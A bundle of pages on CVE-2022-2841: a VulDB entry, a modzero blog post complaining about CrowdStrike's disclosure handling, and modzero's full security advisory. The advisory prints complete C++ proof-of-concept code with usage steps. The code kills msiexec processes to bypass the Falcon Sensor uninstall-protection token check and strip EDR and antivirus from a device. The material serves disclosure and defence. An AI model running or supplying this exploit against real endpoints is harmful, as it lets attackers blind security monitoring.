=== Content from vuldb.com_51bfdc88_20250108_105538.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [History](?history.206880)
* [Diff](?diff.206880)
* [Relate](?relate.206880)
* [API JSON](?json.206880)
* [API XML](?xml.206880)
* [Add](?id.add)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)[VDB-206880](?id.206880 "VulDB") Â· [CVE-2022-2841](?source_cve.206880 "Cve") Â· [EDB 51146](?source_exploitdb.206880 "Exploitdb")
# CrowdStrike Falcon 6.31.14505.0/6.42.15610/6.44.15806 Uninstallation authorization

[History](?history.206880)[Diff](?diff.206880)[relate](?relate.206880)[json](?login)[xml](?login)[CTI](?ctiid.206880)

| CVSS Meta Temp ScoreCVSS is a standardized scoring system to determine possibilities of attacks. The Temp Score considers temporal factors like disclosure, exploit and countermeasures. The unique Meta Score calculates the average score of different sources to provide a normalized scoring system. | Current Exploit Price (â‰ˆ)Our analysts are monitoring exploit markets and are in contact with vulnerability brokers. The range indicates the observed or calculated exploit price to be seen on exploit markets. A good indicator to understand the monetary effort required for and the popularity of an attack. | CTI Interest ScoreOur Cyber Threat Intelligence team is monitoring different web sites, mailing lists, exploit markets and social media networks. The CTI Interest Score identifies the interest of attackers and the security community for this specific vulnerability in real-time. A high score indicates an elevated risk to be targeted for this vulnerability. |
| --- | --- | --- |
| 3.5 | $0-$5k | 0.17 |

A vulnerability was found in [CrowdStrike Falcon 6.31.14505.0/6.42.15610/6.44.15806](?product.crowdstrike:falcon). It has been classified as problematic. Affected is some unknown functionality of the component *Uninstallation Handler*. The manipulation with an unknown input leads to a authorization vulnerability. CWE is classifying the issue as [CWE-862](?vulnerability_cwe.206880 "Cwe"). The product does not perform an authorization check when an actor attempts to access a resource or perform an action. This is going to have an impact on availability.

The weakness was published 08/22/2022 by Pascal Zenker and Max Moser with modzero AG as *Ridiculous vulnerability disclosure process with CrowdStrike Falcon Sensor*. The advisory is shared for download at [modzero.com](?advisory_url.206880). This vulnerability is traded as [CVE-2022-2841](?source_cve.206880 "Cve"). Technical details are unknown but a public exploit is available.

A public exploit has been developed by Pascal Zenker/Max Moser. The exploit is shared for download at [modzero.com](?exploit_url.206880). It is declared as functional. The vulnerability was handled as a non-public zero-day exploit for at least 54 days. During that time the estimated underground price was around $0-$5k.

Upgrading to version 6.40.15409, 6.42.15611 or 6.44.15807 eliminates this vulnerability.

The vulnerability is also documented in the vulnerability database at Exploit-DB ([51146](?source_exploitdb.206880 "Exploitdb")). Similar entries are available at [VDB-214781](?id.214781), [VDB-220568](?id.220568), [VDB-220764](?id.220764) and [VDB-220765](?id.220765).

## Product[info](?kb.cpe)

**Vendor**

* [CrowdStrike](?vendor.crowdstrike)

**Name**

* [Falcon](?product.crowdstrike:falcon)

**Version**

* [6.31.14505.0](?product.crowdstrike:falcon)
* [6.42.15610](?product.crowdstrike:falcon)
* [6.44.15806](?product.crowdstrike:falcon)

## CPE 2.3[info](?kb.cpe)

* [ðŸ”](?pay)
* [ðŸ”](?pay)
* [ðŸ”](?pay)

## CPE 2.2[info](?kb.cpe)

* [ðŸ”](?pay)
* [ðŸ”](?pay)
* [ðŸ”](?pay)

## Video

[![](/screenshot/unlock_video.jpg "Unlock required to see video")](?pay)[Open video](?source_videolink.206880) | [Show more videos](?videos)
## CVSSv4[info](?kb.cvss)

VulDB CVSS-B Score: [ðŸ”](?pay)
VulDB CVSS-BT Score: [ðŸ”](?pay)
VulDB Vector: [ðŸ”](?pay)
VulDB Reliability: [ðŸ”](?pay)
## CVSSv3[info](?kb.cvss)

VulDB Meta Base Score: 3.5
VulDB Meta Temp Score: 3.5

VulDB Base Score: [2.7](https://www.first.org/cvss/v3.1/specification-document#Base-Metrics)
VulDB Temp Score: [2.5](https://www.first.org/cvss/v3.1/specification-document#Temporal-Metrics)
VulDB Vector: [ðŸ”](?pay)
VulDB Reliability: [ðŸ”](?pay)

Researcher Base Score: 6.0
Researcher Vector: [ðŸ”](?pay)

NVD Base Score: [2.7](?source_nvd.206880)
NVD Vector: [ðŸ”](?pay)

CNA Base Score: [2.7](?source_nvd.206880)
CNA Vector (VulDB): [ðŸ”](?pay)
## CVSSv2[info](?kb.cvss)

[| AV | AC | Au | C | I | A |
| --- | --- | --- | --- | --- | --- |
| ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ |
| ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ |
| ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ | ðŸ’³ |

| Vector | Complexity | Authentication | Confidentiality | Integrity | Availability |
| --- | --- | --- | --- | --- | --- |
| unlock | unlock | unlock | unlock | unlock | unlock |
| unlock | unlock | unlock | unlock | unlock | unlock |
| unlock | unlock | unlock | unlock | unlock | unlock |](?pay)
VulDB Base Score: [ðŸ”](?pay)
VulDB Temp Score: [ðŸ”](?pay)
VulDB Reliability: [ðŸ”](?pay)
## Exploiting[info](?kb.exploitprices)

Class: Authorization
CWE: [CWE-862 / CWE-863 / CWE-285](?vulnerability_cwe.206880 "Cwe")
CAPEC: [ðŸ”](?pay)
ATT&CK: [ðŸ”](?pay)

Local: No
Remote: Yes

Availability: [ðŸ”](?pay)
Access: Public
Status: Functional
Author: Pascal Zenker/Max Moser
Download: [ðŸ”](?pay)

EPSS Score: [ðŸ”](?pay)
EPSS Percentile: [ðŸ”](?pay)

Price Prediction: [ðŸ”](?pay)
Current Price Estimation: [ðŸ”](?pay)
 [| 0-Day | unlock | unlock | unlock | unlock |
| --- | --- | --- | --- | --- |
| Today | unlock | unlock | unlock | unlock |](?pay)
Exploit-DB: [ðŸ”](?pay)
## Threat Intelligence[info](?kb.cti)

Interest: [ðŸ”](?pay)
Active Actors: [ðŸ”](?pay)
Active APT Groups: [ðŸ”](?pay)
## Countermeasures[info](?kb.countermeasures)

Recommended: Upgrade
Status: [ðŸ”](?pay)

0-Day Time: [ðŸ”](?pay)

Upgrade: Falcon 6.40.15409/6.42.15611/6.44.15807
## Timeline[info](?kb.timelines)

06/29/2022   [ðŸ”](?pay)
08/16/2022  +48 days [ðŸ”](?pay)
08/22/2022  +6 days [ðŸ”](?pay)
08/22/2022  +0 days [ðŸ”](?pay)
12/24/2024  +855 days [ðŸ”](?pay)
## Sources[info](?kb.sources)

Advisory: [Ridiculous vulnerability disclosure process with CrowdStrike Falcon Sensor](?advisory_url.206880 "Advisory")
Researcher: [Pascal Zenker, Max Moser](https://www.modzero.ch)
Organization: modzero AG
Status: Confirmed

CVE: [CVE-2022-2841](?source_cve.206880 "Cve") ([ðŸ”](?pay))
See also: [ðŸ”](?pay)
## Entry[info](?kb.moderation)

Created: 08/22/2022 10:01 AM
Updated: 12/24/2024 05:03 AM
Replaces Duplicates: [ðŸ”](?pay)
Changes: [08/22/2022 10:01 AM (37), 08/22/2022 10:04 AM (19), 08/23/2022 07:45 AM (8), 09/24/2022 09:04 AM (2), 09/24/2022 09:06 AM (21), 12/29/2022 03:11 PM (9), 12/24/2024 05:03 AM (17)](?diff.206880)
Complete: [ðŸ”](?pay)
Cache ID: 109:10C:111
## Discussion

No comments yet. Languages: en.

[Please log in to comment.](?login)

[â—‚ Previous](?id.206879)[Overview](?live.recent)[Next â–¸](?id.206881)

# Want to stay up to date on a daily basis?

Enable the mail alert feature now!

[Â© 1997-2025 vuldb.com](?kb.terms) Â· [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?id.206880 "German") Â· [fr](/fr/?id.206880 "French") Â· [it](/it/?id.206880 "Italian") Â· [es](/es/?id.206880 "Spanish") Â· [pt](/pt/?id.206880 "Portuguese") Â· [ru](/ru/?id.206880 "Russian") Â· [pl](/pl/?id.206880 "Polish") Â· [sv](/sv/?id.206880 "Swedish") Â· [zh](/zh/?id.206880 "Chinese") Â· [ja](/ja/?id.206880 "Japanese") Â· [ar](/ar/?id.206880 "Arabic")[v18.14.7](?kb.changelog)

=== Content from www.modzero.com_b7503887_20250108_105538.html ===

# [mod%log](../../../../../index.html)

modzero AG

[Main](../../../../../index.html) >
[Archives](../../../../../archives/index.html) >
[2022](../../../../../archives/2022/index.html) >

[08](../../../../../archives/2022/08/index.html) >

[<](../../../../../archives/2022/05/31/en_hoot_hoot_pwn/index.html)

10:01:23
[>](../../../../../archives/2022/12/19/better_make_sure_your_password_manager_is_secure/index.html)
## 2022-08-22

### Ridiculous vulnerability disclosure process with CrowdStrike Falcon Sensor

[Today, we publish a new advisory](https://www.modzero.com/advisories/MZ-22-02-CrowdStrike-FalconSensor.txt) for a vulnerability in the [CrowdStrike](https://www.crowdstrike.com) Falcon Sensor, that was found by our team-mate [Pascal Zenker](https://twitter.com/parzel2) as part of a recent red-teaming engagement.

The vulnerability is a case of [insufficient control flow management](https://cwe.mitre.org/data/definitions/691.html), that allows an attacker with administrative privileges to bypass the [*Falcon Agent Uninstall Protection*](https://www.crowdstrike.com/blog/tech-center/uninstall-protection-for-the-falcon-agent/) feature of CrowdStrike. As the exploit needs high privileges, the overall risk of the vulnerability is very limited.

While the vulnerability itself might not be worth a blog post, we'd like to write a few lines about the **ridiculous disclosure process**.

CrowdStrike is a major vendor in the area of IT security and we expected a straightforward coordinated disclosure process. To our surprise, the communication and disclosure with CrowdStrike was tedious and turned unprofessional in the end. Throughout the whole process, CrowdStrike pushed us repeatedly to disclose the vulnerability through their [HackerOne](https://www.hackerone.com/) bug bounty program, which would have forced us to agree on the *HackerOne* Disclosure terms.

We communicated early on that we are neither willing to participate in any bug bounty program nor sign an [NDA](https://en.wikipedia.org/wiki/Non-disclosure_agreement), because we are the ones, providing information to them. After providing CrowdStrike with a draft of the security advisory and exploit source code we were informed that they could not replicate the issue with an updated version of the sensor. Our request for a 14-day trial version to verify that ourselves was denied.

As the issue was not considered valid, we informed CrowdStrike that we would release the advisory to the public. In response, CrowdStrike tried again to set up a bug bounty disclosure meeting between "*modzero's Sr Leadership*" and CrowdStrike CISO "*[...] to discuss next steps related to **the** bug bounty disclosure*" in contrast to our previously stated disclosure rules.

Sometime later, we were able to acquire an updated version of the sensor and discovered that parts of the formerly provided exploit code and a specific *msiexec* call, are now flagged as malicious behaviour by the sensor. This leads us to conclude that CrowdStrike tried to "fix" the issue, while being told the issue didn't exist. Which is pretty **disrespectful** to us.

We were able to circumvent the countermeasures introduced silently by CrowdStrike. With small changes to the exploit, it is now working again (tested with version 6.42.15610 of the CrowdStrike Falcon software).

We believe that vulnerability disclosure is a two-way street. Vendors, as well as researchers, should act responsibly and show mutual goodwill and transparency. Mutual non-disclosure agreements and restrictions imposed by bug bounty programs limit the disclosure process. Remember, just because no CVE-IDs are publicly known, does not mean bugs haven't been reported and fixed. Many bug bounty reports never assign CVE-IDs, leading to a false perception of security and software quality.

## References

* Proof of Concept screencast: <https://youtu.be/3If-Fqwx-4s>
* modzero Security Advisory MZ-22-02: <https://www.modzero.com/advisories/MZ-22-02-CrowdStrike-FalconSensor.txt>

## Disclosure Timeline

```

2022/04    - Found   vulnerability  in   CrowdStrike  Falcon   Sensor
             (6.31.14505.0)

2022/06/04 - modzero  asked  for   security  contact  @  CrowdStrike,
             because their "report a  security bug" page only refered
             to the hackerone Bug Bounty program.

2022/06/06 - CS  answered   that  modzero   can  use   the  hackerone
             submission page, or  send an E-Mail to  their support at
             support@crowdstrike.com.

2022/06/06 - modzero  asked   if  it   is  okay  to   send  sensitive
             information  about  0day  vulnerabilities  to  support@.
             modzero also told  CS that we are not  willing to accept
             terms & conditions  of hackerone, which is  why we asked
             for a direct security contact.

2022/06/06 - CS offered  to enroll  modzero in  a private  bug bounty
             program at  hackerone, under the conditions  that we are
             willing to sign a mutual non-disclosure agreement.

2022/06/07 - to  prevent further  misunderstandings, modzero  told CS
             again, that:

             * we would like to submit a security related bug.
             * we  don't  want  to  participate  in  any  bug  bounty
             programs.
             * we are not willing to  sign any NDA because WE are the
             ones, providing information to CS.
             * we are  not  willing  to accept  any sort  of terms  &
             conditions that  are out of  scope of well  known hacker
             ethics.
             * we  only want  to get a  reliable security  contact on
             their side.

             Aditionally,  modzero  sent  a  link  to  their  current
             vulnerability disclosure policy.

2022/06/07 - CS told us to send the report to bugs@ for review.

2022/06/13 - CS asked for the report.

2022/06/13 - modzero told CS  that we need a little bit  more time to
             finish and double check everything before submitting.

2022/06/29 - modzero sent Security Advisory (draft), Proof of Concept
             exploit sourcecode, executable and a Screencast video of
             the PoC to CS.

2022/06/29 - CS  told  us,  that  we   were  testing  using  only  an
             unsupported  version of  the Falcon  Sensor. CS  told us
             about the  error message and  that they are not  able to
             reproduce.

2022/07/05 - modzero told  CS that the  error message can  be ignored
             and refered to their PoC screencast video. We also asked
             for a recent (14-day trial)  version of Falcon Sensor to
             provide reliable information if  the most recent version
             is still vulnerable or not.

2022/07/05 - CS answered: "We  do not provide trial  licenses as part
             of this  process, however having  tested the PoC  on our
             end with  a modern sensor this  does not appear to  be a
             valid issue."

2022/07/05 - modzero  announced publishing  the advisory  and exploit
             code by end  of week, asking if the quote  of CS "Having
             tested the PoC on our end with a modern sensor this does
             not  appear to  be a  valid issue"  can be  used in  our
             report.

2022/07/06 - CS asking for a  meeting between modzero's Sr Leadership
             and CS to  discuss next steps related to  the bug bounty
             disclosure.

2022/07/07 - modzero, again,  told CS, that we  are not participating
             in any bug  bounty program and that there is  no need to
             discuss NDAs or bug bounty programs.

2022/08/12 - modzero managed to acquire a recent version (6.42.15610)
             of CrowdStrike  Falcon and verified, that  the attack is
             still  possible. Furthermore,  modzero figured  out that
             the  vulnerability  (that  was rejected  by  CrowdStrike
             first) has  been silently fixed:  The PoC that  has been
             sent  to  CrowdStrike  was  flagged  as  malicious.  The
             msiexec  call of  the  deinstaller was  also flagged  as
             malicious.  Both "countermeasures"  can be  circumvented
             easily, we updated the exploit accordingly.

2022/08/22 - modzero   publishes   Security  Advisory   and   exploit
             code,  because  CrowdStrike  was  unwilling  to  set  up
             a  cooperative  information  exchange outside  of  their
             NDA-ridden BugBounty program  to discuss vulnerabilities
             in their products.

```

Posted by modzero
| [Permanent link](../../../../../archives/2022/08/22/ridiculous_vulnerability_disclosure_process_with_crowdstrike_falcon_sensor/index.html)
| File under: [security](../../../../../archives/security/index.html),
[software](../../../../../archives/software/index.html),
[hacking](../../../../../archives/hacking/index.html),
[modzero](../../../../../archives/modzero/index.html),
[exploit](../../../../../archives/exploit/index.html),
[redteam](../../../../../archives/redteam/index.html),
[rant](../../../../../archives/rant/index.html),
[advisory](../../../../../archives/advisory/index.html)

[/\](#top)



=== Content from www.modzero.com_a6eceae1_20250108_105538.html ===
------------------------------------------------------------------v1-
modzero Security Advisory [MZ-22-02]:
Uninstall Protection Bypass for CrowdStrike Falcon Sensor
---------------------------------------------------------------------
CrowdStrike Falcon is a cloud-powered endpoint detection and response
(EDR) and antivirus (AV) solution. On each end-device a lightweight
managed sensor is deployed and makes use of the cloud-based
capabilities. The sensor can be configured with a uninstall
protection. It prevents the uninstallation of CrowdStrike Falcon
sensor on the end-device without a one-time generated token.
Exploiting this vulnerability allows an attacker with administrative
privileges to bypass the token check on Windows end-devices and to
uninstall the sensor from the device without proper authorization,
effectively removing the device's EDR and AV protection.
---------------------------------------------------------------------
1. Timeline
---------------------------------------------------------------------
2022/04 - Found vulnerability in CrowdStrike Falcon Sensor
(6.31.14505.0)
2022/06/04 - modzero asked for security contact @ CrowdStrike,
because their "report a security bug" page only refered
to the hackerone Bug Bounty program.
2022/06/06 - CS answered that modzero can use the hackerone
submission page, or send an E-Mail to their support at
support@crowdstrike.com.
2022/06/06 - modzero asked if it is okay to send sensitive
information about 0day vulnerabilities to support@.
modzero also told CS that we are not willing to accept
terms & conditions of hackerone, which is why we asked
for a direct security contact.
2022/06/06 - CS offered to enroll modzero in a private bug bounty
program at hackerone, under the conditions that we are
willing to sign a mutual non-disclosure agreement.
2022/06/07 - to prevent further misunderstandings, modzero told CS
again, that:
\* We would like to submit a security related bug.
\* We don't want to participate in any bug bounty
programs.
\* We are not willing to sign any NDA because WE are the
ones, providing information to CS.
\* We are not willing to accept any sort of terms and
conditions that are out of scope of well known hacker
ethics.
\* We only want to get a reliable security contact on
their side.
Aditionally, modzero sent a link to their current
vulnerability disclosure policy.
2022/06/07 - CS told us to send the report to bugs@ for review.
2022/06/13 - CS asked for the report.
2022/06/13 - modzero told CS that we need a little bit more time to
finish and double check everything before submitting.
2022/06/29 - modzero sent Security Advisory (draft), Proof of Concept
exploit sourcecode, executable and a Screencast video of
the PoC to CS.
2022/06/29 - CS told us, that we were testing using only an
unsupported version of the Falcon Sensor. CS told us
about the error message and that they are not able to
reproduce.
2022/07/05 - modzero told CS that the error message can be ignored
and refered to the PoC screencast video. We also asked
for a recent (14-day trial) version of Falcon Sensor to
provide reliable information if the most recent version
is still vulnerable or not.
2022/07/05 - CS answered: "We do not provide trial licenses as part
of this process, however having tested the PoC on our
end with a modern sensor this does not appear to be a
valid issue."
2022/07/05 - modzero announced publishing the advisory and exploit
code by end of week, asking if the quote of CS "Having
tested the PoC on our end with a modern sensor this does
not appear to be a valid issue" can be used in our
report.
2022/07/06 - CS asking for a meeting between modzero's Sr Leadership
and CS to discuss next steps related to the bug bounty
disclosure.
2022/07/07 - modzero, again, told CS, that we are not participating
in any bug bounty program and that there is no need to
discuss NDAs or bug bounty programs.
2022/08/12 - modzero managed to acquire a recent version (6.42.15610)
of CrowdStrike Falcon and verified, that the attack is
still possible. Furthermore, modzero figured out that
the vulnerability (that was rejected by CrowdStrike
first) has been silently fixed: The PoC that has been
sent to CrowdStrike was flagged as malicious. The
msiexec call of the deinstaller was also flagged as
malicious. Both "countermeasures" can be circumvented
easily, we updated the exploit accordingly.
2022/08/22 - modzero publishes Security Advisory and exploit
code, because CrowdStrike was unwilling to set up
a cooperative information exchange outside of their
NDA-ridden bug bounty program to discuss vulnerabilities
in their products.
---------------------------------------------------------------------
2. Summary
---------------------------------------------------------------------
Vendor: CrowdStrike
Homepage: https://www.crowdstrike.com/endpoint-security-products/falcon-endpoint-protection-enterprise/
Error Class:
\* CWE-691: Insufficient Control Flow Management
(https://cwe.mitre.org/data/definitions/691.html)
The code does not sufficiently manage its control flow during
execution, creating conditions in which the control flow can be
modified in unexpected ways.
Products known to be affected:
\* CrowdStrike Falcon (6.31.14505.0)
\* CrowdStrike Falcon (6.42.15610)
Please note: Other versions might be affected as
well, but were not tested by modzero.
CVE-ID: CVE-2022-2841
Severity: Medium/4.4 (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H)
Vendor: CrowdStrike
Product: CrowdStrike Falcon
Version: 6.42.15610
Attack type: Local
Affected Components: Uninstall Protection
---------------------------------------------------------------------
3. Details
---------------------------------------------------------------------
CrowdStrike Falcon is a cloud-native antivirus (AV) and endpoint
detection and response (EDR) solution for end-devices. A sensor agent
is deployed on each end-device, which are then managed and connected
with a cloud monitoring system.
The "Uninstall Protection" feature allows to lock down devices and
prevent device users, including administrators, from removing the
sensor agent without a one-time, device-specific maintenance token.
During a security analysis modzero was required to uninstall a
CrowdStrike Falcon Sensor installation on a Windows workstation
without having access to the maintenance token.
After analysing the software removal procedure, it was possible to
develop an automated proof of concept tool, which corrupts the
CrowdStrike Falcon Sensor removal process. As a result, the procedure
ignores the maintenance token check.
This allows an attacker with administrator rights to uninstall and
stop the CrowdStrike Falcon Sensor and its corresponding Windows
services without a valid token.
---------------------------------------------------------------------
4. Impact
---------------------------------------------------------------------
An attacker with administrative access to a machine, can bypass the
"Uninstall Protection" of the CrowdStrike Falcon Sensor.
The attack removes the software, leaving the CrowdStrike
administrator in the dark about potential attacks on the now
unprotected endpoint.
This is particularly undesirable, given that this is a cloud-native
service where customers expect alerts for security-related actions.
---------------------------------------------------------------------
5. Proof of Concept
---------------------------------------------------------------------
The following proof of concept code allows an administrator to remove
the CrowdStrike Falcon Sensor without maintenance token:
//
// CrowdStrike Falcon Sensor
// De-Installation Auth-Bypass Proof-of-Concept
//
// Falcon Sensor is installed with an uninstall protection, to prevent unauthorized administrators
// from removing Falcon Sensor. The following Proof-of-Concept exploit allows to bypass the
// uninstall protection (token check). This can be used to remove the endpoint's EDR and AV protection.
//
// References:
// - modzero MZ-22-02 Security Advisory
// - CVE: CVE-2022-2841
//
// Version: 0.3
// Secrecy: CONFIDENTIAL
// Copyright 2022, modzero AG, Wartstr. 20, 8400 Winterthur, Switzerland
//
// Usage example:
// .\CSFalconTokenBypass.exe 'C:\ProgramData\Package Cache\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}v6.XX.XX.0\CsAgent.LionLanner.msi'
//
#pragma once
#define \_CRT\_SECURE\_NO\_WARNINGS
#include
#include
#include
#include
#include

#include
std::list g\_msiexec\_instances = {};
int g\_msiexec\_instance\_count = 0;
void CheckProcess(DWORD process\_id)
{
TCHAR process\_name[MAX\_PATH] = { 0 };
HANDLE h\_proc = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, process\_id);
if (nullptr != h\_proc) {
HMODULE h\_mod = 0;
DWORD c\_need = 0;
if (EnumProcessModules(h\_proc, &h\_mod, sizeof(h\_mod), &c\_need)) {
GetModuleBaseName(h\_proc, h\_mod, process\_name,
sizeof(process\_name) / sizeof(char));
}
} else {
return;
}
if (wcsstr(\_wcslwr(process\_name), \_\_T("msiexec"))) {
bool already\_found = (
std::find(
g\_msiexec\_instances.begin(),
g\_msiexec\_instances.end(),
process\_id) != g\_msiexec\_instances.end()
);
if (!already\_found) {
g\_msiexec\_instance\_count++;
std::cout << "[+] Installer spawned process: " << process\_id << std::endl;
g\_msiexec\_instances.push\_front(process\_id);
// If it's the third process, we try to kill it to produce open MSIHandles.
// This will break the uninstaller token check.
if (g\_msiexec\_instance\_count == 4 || g\_msiexec\_instance\_count == 5) {
std::cout << "[+] Killing process: " << process\_id << std::endl;
if (!TerminateProcess(h\_proc, 123)) {
std::cout << "[!] Failed to kill process with PID " << process\_id << ": " << GetLastError() << std::endl;
}
if (g\_msiexec\_instance\_count == 5) {
std::cout << "[+] Uninstall Protection should be bypassed." << std::endl;
exit(0);
}
}
}
}
CloseHandle(h\_proc);
}
int main(int argc, char\* argv[])
{
DWORD proc\_ids[1024] = { 0 };
DWORD c\_need = 0;
DWORD c\_procs = 0;
DWORD i = 0;
if (argc != 2) {
std::cout << "Usage:" << std::endl << argv[0] << " PATH\_TO\_CsAgent.LionLanner.msi" << std::endl;
return 1;
}
// increase priority to realtime and start uninstall
SetPriorityClass(GetCurrentProcess(), REALTIME\_PRIORITY\_CLASS);
std::string path = std::string(argv[1]);
unsigned first = path.find("{");
unsigned last = path.find\_last\_of("}");
std::string guid = path.substr (first,last-first+1);
std::string cmd = "start msiexec /x " + guid;
system(cmd.c\_str());
// now listen for processes popping up
while (1) {
if (!EnumProcesses(proc\_ids, sizeof(proc\_ids), &c\_need)) {
std::cout << "[-] Failed to read processes." << std::endl;
return 1;
}
c\_procs = c\_need / sizeof(DWORD);
// Check every process ID
for (i = 0; i < c\_procs; i++) {
if (proc\_ids[i] != 0) {
CheckProcess(proc\_ids[i]);
}
}
}
return 0;
}
To use the Proof of Concept, the code must be compiled with Visual
Studio, and be run as administrator, pointing to
`CsAgent.LionLanner.msi` as argument e.g.:
.\CSFalconTokenBypass.exe 'C:\ProgramData\Package Cache\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}v6.XX.XX.0\CsAgent.LionLanner.msi'
After executing it, the software removal procedure starts and a popup
with an error message, that the token is invalid will show up. After
closing the popup, the uninstallation continues and removes
all components.
---------------------------------------------------------------------
6. Fix
---------------------------------------------------------------------
- n/a
---------------------------------------------------------------------
7. Credits
---------------------------------------------------------------------
\* Pascal Zenker (parzel) of modzero
\* Max Moser (mmo) of modzero
---------------------------------------------------------------------
8. About modzero
---------------------------------------------------------------------
The independent Swiss-German company modzero assists clients with
security analysis in the complex areas of computer technology. The
focus lies on highly detailed technical analysis of concepts,
software and hardware components as well as the development of
individual solutions. Colleagues at modzero work exclusively in
practical, highly technical computer-security areas and can draw on
decades of experience in various platforms, system concepts, and
designs.
https://www.modzero.com contact@modzero.com
modzero follows coordinated disclosure practices described here:
https://www.modzero.com/static/modzero\_Disclosure\_Policy.pdf.
This policy should have been sent to the vendor along with this
security advisory.
---------------------------------------------------------------------
9. Disclaimer
---------------------------------------------------------------------
The information in the advisory is believed to be accurate at the
time of publishing based on currently available information. Use of
the information constitutes acceptance for use in an AS IS condition.
There are no warranties concerning this information. Neither the
author nor the publisher accepts any liability for any direct,
indirect, or consequential loss or damage arising from using, or
reliance on, this information.


=== Content from youtu.be_c362567a_20250108_105539.html ===
[About](https://www.youtube.com/about/)[Press](https://www.youtube.com/about/press/)[Copyright](https://www.youtube.com/about/copyright/)[Contact us](/t/contact_us/)[Creators](https://www.youtube.com/creators/)[Advertise](https://www.youtube.com/ads/)[Developers](https://developers.google.com/youtube)[Terms](/t/terms)[Privacy](/t/privacy)[Policy & Safety](https://www.youtube.com/about/policies/)[How YouTube works](https://www.youtube.com/howyoutubeworks?utm_campaign=ytgen&utm_source=ythp&utm_medium=LeftNav&utm_content=txt&u=https%3A%2F%2Fwww.youtube.com%2Fhowyoutubeworks%3Futm_source%3Dythp%26utm_medium%3DLeftNav%26utm_campaign%3Dytgen)[Test new features](/new)Â© 2025 Google LLC
